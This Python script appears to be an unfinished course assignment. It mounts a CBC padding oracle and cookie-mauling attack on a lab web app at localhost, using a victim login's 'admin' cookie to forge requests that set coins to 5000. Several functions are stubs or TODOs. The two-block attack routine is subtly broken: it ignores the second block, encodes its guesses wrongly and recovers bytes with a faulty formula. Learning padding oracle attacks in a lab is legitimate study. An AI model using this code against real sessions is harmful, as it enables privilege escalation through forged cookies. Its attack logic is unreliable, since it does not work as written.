import os
from cryptography.hazmat.primitives import hashes, padding, ciphers
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import algorithms

from requests import codes, Session
import requests

import app.api.encr_decr

import base64
import binascii

LOGIN_FORM_URL = "http://localhost:8080/login"
SETCOINS_FORM_URL = "http://localhost:8080/setcoins"

# Functions for logging in from maul
from maul import do_login_form, do_setcoins_form


# You should implement this padding oracle object
# to craft the requests containing the mauled
# ciphertexts to the right URL.
class PaddingOracle(object):

    def __init__(self, po_url): 
        self.url = po_url
        self._block_size_bytes = ciphers.algorithms.AES.block_size/8
        print("Block size bytes: {}".format(self._block_size_bytes))

    @property
    def block_length(self):
        return self._block_size_bytes

    # you'll need to send the provided ciphertext
    # as the admin cookie, retrieve the request,
    # and see whether there was a padding error or not.
    def test_ciphertext(self, ct):
        pass

def split_into_blocks(msg, l):
    while msg:
        yield msg[:l]
        msg = msg[l:]
    
def po_attack_2blocks(po, ctx):
    """Given two blocks of cipher texts, it can recover the first block of
    the message.
    @po: an instance of padding oracle. 
    @ctx: a ciphertext 
    """
    assert len(ctx) == 2*po.block_length, "This function only accepts 2 block "\
        "cipher texts. Got {} block(s)!".format(len(ctx)/po.block_length)
    c0, c1 = list(split_into_blocks(ctx, int(po.block_length)))
    print("C0 (len {}): {}".format(len(c0), c0))
    print("C1 (len {}): {}".format(len(c1), c1))

    # TODO: Implement padding oracle attack for 2 blocks of messages.

    plaintext = bytearray(16)
    for i in range(15, -1, -1): 
        test = bytearray(16) 
        for val in range(256):
            test[i] = val
            if check_padding_response(str(test).encode('utf-8')):
                plaintext[i] = val ^ c0[i] ^ (16 - i)
    return plaintext

def po_attack(po, ctx):
    """
    Padding oracle attack that can decrpyt any arbitrary length messags.
    @po: an instance of padding oracle. 
    You don't have to unpad the message.
    """
    ctx_blocks = list(split_into_blocks(ctx, po.block_length)) # TODO: Is this block length correct for the hex string?
    nblocks = len(ctx_blocks)
    # TODO: Implement padding oracle attack for arbitrary length message.

def is_response_ok(response):
    """
    Given a requests.Response object, does the 'error' div exist?
    """
    error = int(response.text.find('error'))
    if error != -1:
        #print("Error Div found at index: {}".format(error))
        return False
    return True

def check_padding_response(cookie):
    """
    Given a cookie, make request to /setcoins with that cookie as admin cookie
    """
    sess.cookies.set("admin", None)
    sess.cookies.set("admin", cookie.hex())
    #print("Cookies after maul: {}".format(sess.cookies.get_dict()))
    result, response = do_setcoins_form(sess, uname, 5000)
    
    return is_response_ok(response)

if __name__ == "__main__":
    print("Running Padding Oracle Attack")
    
    sess = Session()
    print("Cookie pre logon: {}".format(sess.cookies.get_dict()))
    uname ="victim"
    pw = "victim"
    assert(do_login_form(sess, uname,pw))
    print("Cookies after logon: {}".format(sess.cookies.get_dict()))
    admin_cookie = sess.cookies.get_dict()["admin"]
    print("Admin cookie: {}".format(admin_cookie))
    admin_cookie_bytes = bytearray.fromhex(admin_cookie)
    print("Admin cookie bytes: {}".format(admin_cookie_bytes))

    # First byte (C0 == IV)
    C0 = admin_cookie_bytes[0]
    print("CO: {}".format(C0))
    admin_cookie_bytes[0] = 1

    # Check padding response success
    # success = check_padding_response(bytes(16))
    # print("Success? {}".format(success))

    TEST_COOKIE = bytearray.fromhex("e9fae094f9c779893e11833691b6a0cd3a161457fa8090a7a789054547195e606035577aaa2c57ddc937af6fa82c013d")
    print("Test cookie (len {}): {}".format(len(TEST_COOKIE), TEST_COOKIE))
    # success = check_padding_response(TEST_COOKIE)

    print("test cookie first 32 bytes: {}".format(TEST_COOKIE[:32]))
    first_two_blocks = TEST_COOKIE[:32]
    # Instantitate padding oracle
    po = PaddingOracle(SETCOINS_FORM_URL)
    po_attack_2blocks(po, first_two_blocks)


    # TODO: Maul code from part 1.1
    # Maul the admin cookie in the 'sess' object here
    # admin_cookie = sess.cookies.get_dict()["admin"]
    # print("Admin cookie: {}".format(admin_cookie))
    # admin_cookie_bytes = bytearray.fromhex(admin_cookie)
    # print("Admin cookie bytes: {}".format(admin_cookie_bytes))
    # a = admin_cookie_bytes[0]
    # b = 1
    # c = a ^ b
    # admin_cookie_bytes[0] = c
    # print("XOR value: {}".format(c))
    # print("Mauled: {}".format(admin_cookie_bytes))
    # maul = admin_cookie_bytes.hex()

    # # Set new admin cookie with mauled value
    # sess.cookies.set("admin", None)
    # sess.cookies.set("admin", maul)
    # print("Cookies after maul: {}".format(sess.cookies.get_dict()))
    
    # set coins to 5000 coins via the admin's power
    # target_uname = uname
    # amount = 5000
    # result, response = do_setcoins_form(sess, target_uname, amount)
    # print("Attack successful? " + str(result))
    # print("Response: {}".format(response.content))

